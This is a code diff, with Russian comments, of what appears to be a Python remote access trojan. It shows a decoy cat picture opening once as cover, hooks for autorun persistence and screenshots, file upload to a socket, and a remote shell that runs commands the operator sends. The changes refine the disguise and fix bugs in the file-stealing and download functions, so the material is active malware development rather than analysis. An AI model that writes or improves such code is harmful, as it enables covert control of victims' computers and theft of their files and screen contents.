@@ -46,19 +46,32 @@ def reliable_recv(sock):
 
 def open_image():
     try:
-        if hasattr(sys, "_MEIPASS"):
-            image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
-        else:
-            image_path = os.path.join(os.getcwd(), "cutecat.jpg")
-        logging.info(f"[+] Проверяем наличие картинки: {image_path}")
+        # Путь к флаг-файлу, который указывает на первый запуск
+        flag_file = os.path.join(os.environ["APPDATA"], "cutecat_flag.txt")
+        
+        if not os.path.exists(flag_file):  # Проверяем, существует ли флаг-файл
+            if hasattr(sys, "_MEIPASS"):
+                image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
+            else:
+                image_path = os.path.join(os.getcwd(), "cutecat.jpg")
 
-        if os.path.exists(image_path):
-            subprocess.Popen(["start", image_path], shell=True)
-            logging.info("[+] Картинка успешно открыта.")
+            logging.info(f"[+] Проверяем наличие картинки: {image_path}")
+
+            if os.path.exists(image_path):
+                subprocess.Popen(["start", image_path], shell=True)
+                logging.info("[+] Картинка успешно открыта.")
+
+                # Создаем флаг-файл, чтобы картинка больше не запускалась
+                with open(flag_file, "w") as f:
+                    f.write("Картинка уже была открыта")
+            else:
+                logging.error("[!!] Картинка не найдена.")
         else:
-            logging.error("[!!] Картинка не найдена.")
+            logging.info("[+] Картинка уже открывалась ранее. Пропускаем запуск.")
+
     except Exception as e:
         logging.error(f"[!!] Ошибка при открытии картинки: {e}")
+
 
 
 def setup_autorun():
@@ -123,7 +136,7 @@ def screenshot(sock):
 def upload(sock, file_name):
     try:
         with open(file_name, "rb") as file:
-            file_data = base64.b64encode(file.read()).decode
+            file_data = base64.b64encode(file.read()).decode()
             reliable_send(file_data, sock)
         reliable_send("[+] Файл успешно отправлен", sock)
         logging.info(f"[+] Файл {file_name} успешно отправлен")
@@ -202,8 +215,7 @@ def shell(sock):
             elif command.startswith("upload"):
                 save_file(sock, command[7:])
             elif command.startswith("get"):
-                result = download(command[4:], sock)
-                reliable_send(result, sock)
+                download(command[4:], sock)
             elif command.startswith("start"):
                 try:
                     subprocess.Popen(command[6:], shell=True)
